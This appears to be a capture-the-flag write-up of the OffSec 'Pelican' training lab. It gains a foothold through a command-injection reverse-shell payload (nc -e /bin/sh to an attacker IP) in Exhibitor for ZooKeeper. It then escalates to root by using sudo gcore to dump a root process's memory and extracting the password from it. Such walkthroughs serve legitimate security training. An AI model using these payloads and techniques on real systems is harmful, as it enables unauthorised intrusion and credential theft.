---
title: Pelican
image:
    path: /assets/posts/2025-11-27-pelican/WEB.svg
date: 2025-11-27 09:59:00 +/-TTTT
categories: [OffSec]
tags: [OffSec, Linux, Exhibitor for ZooKeeper v.1.0, Gcore Privesc]
---

This lab enhances your skills in identifying and exploiting command injection vulnerabilities and understanding privilege escalation techniques.

## AUTORECON
```
sudo autorecon 192.168.114.98
```
![](/assets/posts/2025-11-27-pelican/Pasted image 20251127090543.png)
![](/assets/posts/2025-11-27-pelican/Pasted image 20251127091124.png)



## PORT 8080 - Http

[http://192.168.114.98:8080/](http://192.168.114.98:8080/)
![](/assets/posts/2025-11-27-pelican/Pasted image 20251127090712.png)

```python
curl http://192.168.114.98:8080/ -I
HTTP/1.1 404 Not Found
Content-Type: text/html; charset=iso-8859-1
Cache-Control: must-revalidate,no-cache,no-store
Content-Length: 1365
Server: Jetty(1.0)
```

Server: Jetty(1.0)

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127090921.png)

[https://www.exploit-db.com/exploits/36318](https://www.exploit-db.com/exploits/36318)

## Foothold

[http://192.168.114.98:8080/exhibitor/v1/ui/index.html](http://192.168.114.98:8080/exhibitor/v1/ui/index.html)
![](/assets/posts/2025-11-27-pelican/Pasted image 20251127091227.png)

Exhibitor for ZooKeeper v1.0

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127091255.png)

## Initial Access

[https://www.exploit-db.com/exploits/48654](https://www.exploit-db.com/exploits/48654)  
[https://medium.com/cyberquestor/exhibitor-v1-authenticated-remote-code-execution-rce-exploit-19f2d8603277](https://medium.com/cyberquestor/exhibitor-v1-authenticated-remote-code-execution-rce-exploit-19f2d8603277)

```
$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
```

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127092059.png)

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127092206.png)

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127092344.png)

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127092247.png)

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127092304.png)

And we get the flag.

```
charles@pelican:/opt/zookeeper$ cd /home/charles
charles@pelican:~$ ls -la
total 28
drwxr-xr-x 3 charles charles 4096 Sep 10  2020 .
drwxr-xr-x 3 root    root    4096 Sep 10  2020 ..
-rw-r--r-- 1 charles charles  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 charles charles 3526 Apr 18  2019 .bashrc
drwxr-xr-x 3 charles charles 4096 Sep 10  2020 .java
-rw-r--r-- 1 charles charles   33 Nov 27 07:03 local.txt
-rw-r--r-- 1 charles charles  807 Apr 18  2019 .profile
charles@pelican:~$ cat local.txt
fXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Internal Enumeration
```
charles@pelican:~$ sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

> `/usr/bin/gcore`: Is a tool (part of gdb) which **creates a core dump**: saves the content of the memory of a running process to a file..

[https://gtfobins.github.io/gtfobins/gcore/](https://gtfobins.github.io/gtfobins/gcore/)

If the binary is allowed to run as superuser byÂ `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
sudo gcore $PID
```

## PRIVILEGE ESCALATION
```
ps aux | grep root
```

We can do a dump of the 494 PID, that is a process running by root user.
![](/assets/posts/2025-11-27-pelican/Pasted image 20251127093720.png)

```
sudo /usr/bin/gcore 494
```

```
charles@pelican:~$ sudo /usr/bin/gcore 494
0x00007f65402f56f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7fff4da7e9e0, remaining=remaining@entry=0x7fff4da7e9e0) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28	../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.494
[Inferior 1 (process 494) detached]
```

```
charles@pelican:~$ strings core.494 | grep password
password-store
/usr/bin/password-store 
/usr/bin/password-store
/usr/bin/password-store
/usr/bin/password-store
/usr/bin/password-store
```

```
charles@pelican:~$ strings core.494 | grep Password
001 Password: root:
```

```
strings core.494
<SNIP>..........<SNIP>
*V/@e
001 Password: root:
XXXHERE_IS_THE_PASSWORDXXXX
0%@e
`f>@e
<SNIP>..........<SNIP>
```

```
root : XXXPASSWORDXXX
```

```
charles@pelican:~$ su root
Password: 
root@pelican:/home/charles# whoami
root
root@pelican:/home/charles# cd /root
root@pelican:~# cat proof.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
root@pelican:~#
```

![](/assets/posts/2025-11-27-pelican/Pasted image 20251127095054.png)